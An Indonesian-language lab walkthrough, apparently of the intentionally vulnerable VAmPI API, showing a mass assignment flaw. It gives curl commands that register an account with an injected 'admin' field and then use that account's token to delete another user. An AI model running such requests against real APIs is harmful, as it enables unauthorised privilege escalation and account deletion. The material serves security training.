# Mass Assignment
Framework terkadang memungkinkan developer untuk mengikat parameter request HTTP ke dalam variabel atau objek secara otomatis untuk membuat penggunaan framework tersebut mudah digunakan. Hal ini terkadang dapat menimbulkan kerugian. Misalnya, developer dapat membiarkan beberapa fungsi privat terbuka untuk umum seperti siapa pun dapat membuat akun admin. Jika fungsi semacam ini ada maka penyerang dapat memanfaatkannya. Celah keamanan ini berada di endpoint `/users/v1/register`. Melalui endpoint tersebut kita bisa mendaftarkan diri sebagai admin hanya dengan menambahkan parameter `admin=true`

- Register akun baru dengan username `test1`
```sh
curl http://IP_Server:5000/users/v1/register -d '{"email":"test1@test.com","username":"test1","password":"test1"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%202.JPG)

- Sekarang kita coba register akun baru dengan username `test2` lalu menambahkan parameter `admin=true` supaya user `test2` bisa bertindak sebagai admin
```sh
curl http://IP_Server:5000/users/v1/register -d '{"email":"test2@test.com","username":"test2","password":"test2","admin":"true"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%204.JPG)

- Setelah kita coba tambahkan parameter `admin=true`, proses registerasi user dinyatakan berhasil oleh sistem artinya user `test2` bisa bertindak sebagai admin
- Pada dokumentasi API sistem di URL `http://IP_Server:5000/ui` terdapat informasi bahwa endpoint `/users/v1/{username}` dengan jenis request `DELETE` hanya bisa diakses oleh admin saja

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%205.JPG)

- Sekarang kita coba apakah user `test2` bisa menghapus user `test1` melalui endpoint tersebut. Pertama-tama kita login sebagai user `test2` dan copy nilai `auth_token`
```sh
curl http://IP_Server:5000/users/v1/login -d '{"username":"test2","password":"test2"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%206.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%207.JPG)

- Setelah itu kita coba hapus akun user `test1` dengan menggunakan menggunakan endpoint `/users/v1/{username}`
```sh
curl -X DELETE http://IP_Server:5000/users/v1/test1 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%208.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%209.JPG)

- User `test2` ternyata bisa menggunakan endpoint `/users/v1/{username}` untuk menghapus akun user `test1`, dimana endpoint `/users/v1/{username}` sebenarnya hanya bisa digunakan oleh admin saja. Tapi dengan menambahkan parameter `admin=true` saat registerasi, akun tersebut akan otomatis terdaftar sebagai admin. Celah keamanan ini bisa digunakan attacker untuk melakukan privileges escalation dan authentication bypass yang memiliki impact sangat berbahaya ke sistem API